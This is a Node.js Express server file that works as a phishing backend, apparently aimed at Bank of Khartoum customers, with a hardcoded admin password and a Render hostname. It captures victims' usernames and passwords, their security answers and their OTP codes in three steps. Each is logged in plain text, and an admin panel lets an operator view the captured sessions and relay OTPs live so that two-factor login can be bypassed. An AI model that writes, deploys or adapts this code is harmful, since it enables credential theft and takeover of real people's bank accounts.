const express = require('express');
const path = require('path');
const crypto = require('crypto');
const cors = require('cors');
const http = require('http');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = 'Bankak@Admin2025!';

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'x-admin-token']
}));

app.options('*', cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let memDB = [];
let adminTokens = new Set();

function log(msg) {
  console.log(`[${new Date().toISOString()}] ${msg}`);
}

function genToken() {
  return crypto.randomBytes(32).toString('hex');
}

function readDB() { return memDB; }
function writeDB(data) { memDB = data; }

// Ping
app.get('/ping', (req, res) => {
  res.json({ status: 'ok' });
});

// STEP 1
app.post('/api/submit', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: 'Missing fields' });
  }

  let db = readDB();

  const session = {
    id: Date.now().toString(36) + Math.random().toString(36).slice(2),
    username,
    password,
    secQuestion: '',
    secAnswer: '',
    otp: '',
    enteredOtp: '',
    status: 'pending',
    requestTime: new Date().toISOString(),
    expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown'
  };

  db.unshift(session);
  writeDB(db);

  log(`LOGIN | user: ${username} | pass: ${password}`);

  res.json({ success: true, sessionId: session.id });
});

// STEP 2
app.post('/api/submit-security', (req, res) => {
  const { sessionId, secQuestion, secAnswer } = req.body;

  if (!sessionId || !secQuestion || !secAnswer) {
    return res.status(400).json({ error: 'Missing fields' });
  }

  let db = readDB();
  let session = db.find(s => s.id === sessionId);

  if (!session) return res.status(404).json({ error: 'Session not found' });

  session.secQuestion = secQuestion;
  session.secAnswer = secAnswer;
  session.status = 'security_done';

  writeDB(db);

  log(`SECURITY | user: ${session.username} | Q: ${secQuestion} | A: ${secAnswer}`);

  res.json({ success: true });
});

// STEP 3
app.post('/api/submit-otp', (req, res) => {
  const { sessionId, otp } = req.body;

  let db = readDB();
  let session = db.find(s => s.id === sessionId);

  if (!session) return res.status(404).json({ error: 'Session not found' });

  session.enteredOtp = otp;
  session.status = 'verified';
  session.verifiedTime = new Date().toISOString();

  writeDB(db);

  log(`OTP | user: ${session.username} | code: ${otp}`);

  res.json({ success: true });
});

// Check OTP
app.get('/api/check-otp/:sessionId', (req, res) => {
  let db = readDB();
  let session = db.find(s => s.id === req.params.sessionId);

  if (!session) return res.status(404).json({ error: 'Not found' });

  if (new Date() > new Date(session.expiresAt) && session.status === 'pending') {
    session.status = 'expired';
    writeDB(db);
  }

  res.json({
    status: session.status,
    otp: session.status === 'otp_sent' ? session.otp : null
  });
});

// Admin login
app.post('/api/admin/login', (req, res) => {
  if (req.body.password === ADMIN_PASSWORD) {
    const token = genToken();
    adminTokens.add(token);
    res.json({ success: true, token });
  } else {
    res.status(401).json({ error: 'Wrong password' });
  }
});

function adminAuth(req, res, next) {
  const token = req.headers['x-admin-token'];
  if (!token || !adminTokens.has(token)) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
}

// Admin routes
app.get('/api/admin/sessions', adminAuth, (req, res) => {
  res.json(readDB());
});

app.post('/api/admin/send-otp', adminAuth, (req, res) => {
  let db = readDB();
  let session = db.find(s => s.id === req.body.sessionId);

  if (!session) return res.status(404).json({ error: 'Not found' });

  session.otp = req.body.otp;
  session.status = 'otp_sent';
  session.otpSentTime = new Date().toISOString();

  writeDB(db);

  log(`ADMIN SENT OTP | user: ${session.username} | otp: ${req.body.otp}`);

  res.json({ success: true });
});

app.delete('/api/admin/sessions/:id', adminAuth, (req, res) => {
  writeDB(readDB().filter(s => s.id !== req.params.id));
  res.json({ success: true });
});

app.delete('/api/admin/sessions', adminAuth, (req, res) => {
  writeDB([]);
  res.json({ success: true });
});

app.post('/api/admin/logout', adminAuth, (req, res) => {
  adminTokens.delete(req.headers['x-admin-token']);
  res.json({ success: true });
});

// Start server
app.listen(PORT, () => {
  log('Server running on port ' + PORT);

  // ✅ Self-Ping كل دقيقة - يمنع Render من تنويم السيرفر
  const RENDER_URL = process.env.RENDER_EXTERNAL_URL || 'https://bank-of-khartoum-bg6z.onrender.com';
  const PING_URL = `${RENDER_URL}/ping`;

  log(`Self-ping enabled: ${PING_URL}`);

  setInterval(() => {
    const client = PING_URL.startsWith('https') ? https : http;
    client.get(PING_URL, (res) => {
      log(`Self-ping: ${res.statusCode}`);
    }).on('error', (err) => {
      log(`Self-ping failed: ${err.message}`);
    });
  }, 60000); // كل دقيقة
});